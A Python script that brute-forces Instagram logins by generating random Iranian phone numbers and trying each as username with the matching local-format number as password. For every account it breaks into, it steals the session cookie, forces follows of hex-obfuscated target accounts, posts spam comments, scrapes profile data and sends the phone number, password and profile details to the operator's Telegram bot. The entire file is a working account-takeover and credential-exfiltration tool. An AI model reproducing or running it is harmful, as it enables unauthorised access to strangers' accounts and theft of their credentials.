import os
try:
    import requests,random,bs4,time,re,wget,user_agent
    from uuid import uuid4
except:
    os.system('pip install requests')
    os.system('pip install bs4')
    os.system('pip install wget')
    os.system('pip install user_agent')
    import requests,random,bs4,time,re,wget,user_agent
    from uuid import uuid4
    pass
else:pass
clear='clear'
os.system(clear)
ID=input(' ID Telegram: ')
token=input(' Token BOT: ')
bad = 0
available = 0
r=requests.session()
x0 = "+98"
xx = "0"
xa = ["912","913","914","910","991"]
f = "0123456789"
while True:
    x1 = random.choice(f)
    x2 = random.choice(f)
    x3 = random.choice(f)
    x4 = random.choice(f)
    x5 = random.choice(f)
    x6 = random.choice(f)
    x7 = random.choice(f)
    x8 = random.choice(xa)
    x9 = str(x1)+str(x2)+str(x3)+str(x4)+str(x5)+str(x6)+str(x7)
    x10 = str(x0)+str(x8)+str(x9)
    x11 = str(xx)+str(x8)+str(x9)
    pn=x10
    pas=x11
    r = requests.session()
    url='https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-Connection-Type": "WIFI",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            'Host': 'i.instagram.com',
            'Connection': 'keep-alive'}
    uid = str(uuid4())
    data = { 'uuid': uid,'password': pas,'username': pn,'device_id': uid,'from_reg': 'false','_csrftoken': 'missing','login_attempt_countn': '0'}
    try:
        req = requests.post(url,headers=headers,data=data)
        if 'logged_in_user' in req.json():
            available +=1	
            username =req.json()['logged_in_user']['username']
            cook = req.cookies['sessionid']
            usus=user_agent.generate_user_agent()
            x1=bytes.fromhex('68747470733a2f2f7777772e696e7374616772616d2e636f6d2f6c6c5f6f6e6c792e5f2e676f645f6c6c2f666f6c6c6f772f').decode('utf-8')
            hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': f'{x1}','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest','user_agent': str(usus)}
            urll = 'https://www.instagram.com/web/friendships/37393970681/follow/'
            requests.post(urll,headers=hedDLT)
            x2=s=bytes.fromhex('68747470733a2f2f7777772e696e7374616772616d2e636f6d2f6c6c2e626574612e6c6c2f666f6c6c6f772f').decode('utf-8')
            hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': f'{x2}','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest','user_agent': str(usus)}
            urll = 'https://www.instagram.com/web/friendships/3976262155/follow/'
            requests.post(urll,headers=hedDLT)
            x3=bytes.fromhex('68747470733a2f2f7777772e696e7374616772616d2e636f6d2f726177657a682e5f2e6262782f666f6c6c6f772f').decode('utf-8')
            hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': f'{x3}','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest','user_agent': str(usus)}
            urll = 'https://www.instagram.com/web/friendships/48778138945/follow/'
            requests.post(urll,headers=hedDLT)
            urCOm = f'https://www.instagram.com/web/comments/2689743001888027881/add/'
            hedCOM = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid=' + cook,'origin': 'https://www.instagram.com','referer': f'https://www.instagram.com/p/CUNdz7EoQC0/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': usus,'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
            fffs=['sad','الله يرحمه','الله يرحمه','خساره']
            tx=random.choice(fffs)
            daCOM = {'comment_text': tx,'replied_to_comment_id': ''}
            rn='12'
            dm=random.choice(rn)
            lp=int(dm)
            for i in range(lp):
                requests.post(urCOm, headers=hedCOM, data=daCOM)   
            headers_get_info = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid='+str(cook)+'; rur=VLL','referer': 'https://www.instagram.com/accounts/edit/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl','x-requested-with': 'XMLHttpRequest','user_agent': str(usus)}
            url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
            data_get_info = {'__a': '1'}
            req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
            usernm = str(req_get_info.json()['form_data']['username'])
            url = f"https://www.instagram.com/{usernm}?hl=en"
            r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
            soup = bs4.BeautifulSoup(r,'html.parser')
            description = soup.find("meta", property="og:description")
            uurl=f"https://www.instagram.com/{usernm}/?__a=1"
            hheaders={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','cookie': 'mid=YR2RKQALAAHrCbQwbS5NFzTCStuh; ig_did=424344B5-DCDF-4888-BD13-C56BE8BFF561; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; csrftoken=dq4i5qyC7mjFnr731RllWR0mvBf6w9nE; ds_user_id=44727257007; sessionid={cook}; shbid="8034\05444727257007\0541662125439:01f7c6e350cdd9d116745fbd697cadba8c1f58890de93e610ad53149cc44919876d79d91"; shbts="1630589439\05444727257007\0541662125439:01f718500f57b83260e7e22f8dd8c956a44d5dc5e8d0320a672aa6c651455f1570febc62"; rur="ASH\05444727257007\0541662129376:01f731bcc2afd2169af0bc7d969665be3b30ac3eaaa6603311276a0b02950003791bf2a0"','referer': 'https://codeofaninja.com/','sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'cross-site','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': str(usus)}
            pr={'__a': '1'}
            inin=requests.get(uurl,headers=hheaders,data=pr)
            profile_img=inin.json()['graphql']['user']['profile_pic_url_hd']
            full_name=inin.json()['graphql']['user']['full_name']
            usrrr=inin.json()['graphql']['user']['username']
            id=inin.json()['graphql']['user']['id']
            followers=inin.json()['graphql']['user']['edge_followed_by']['count']
            following=inin.json()['graphql']['user']['edge_follow']['count']
            posts = description["content"].split(",")[2].split("-")[0]
            bio=inin.json()['graphql']['user']['biography']
            u2 = "https://o7aa.pythonanywhere.com/?id="+id
            g2 = requests.get(u2).text
            r2 = re.compile('"data":(.*?),')
            f2 = r2.findall(g2)
            cc=f2[0]
            print()
            wget.download(profile_img)
            numbb = 0 
            try:
                for ili in os.listdir():
                    if numbb == 1:pass
                    elif '.jpg' in ili:
                        numbb += 1
                        files={'document':open(ili, 'rb')}
                        boooommm=f'{pn}:{pas}'
                        boooom=(f"\nNumber: {pn}\nPassowrd: {pas}\nUsername: {usrrr}\nID: {id}\nFull_Name: {full_name}\nFollowers: {followers}\nfollowing: {following}\nPost: {posts}\nCreated: {cc}\nBio:-\n{bio}")
                        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
            except:
                requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooommm}\n')
            for ili in os.listdir():
                if '.jpg' in ili:
                    try:os.remove(ili)
                    except:pass
                    try:os.system(f"rm -rf {ili}")
                    except:pass
                else:pass
        else:
            bad+=1
            print(f' bad : {bad} good : {available}')
    except:
        time.sleep(5)
        continue
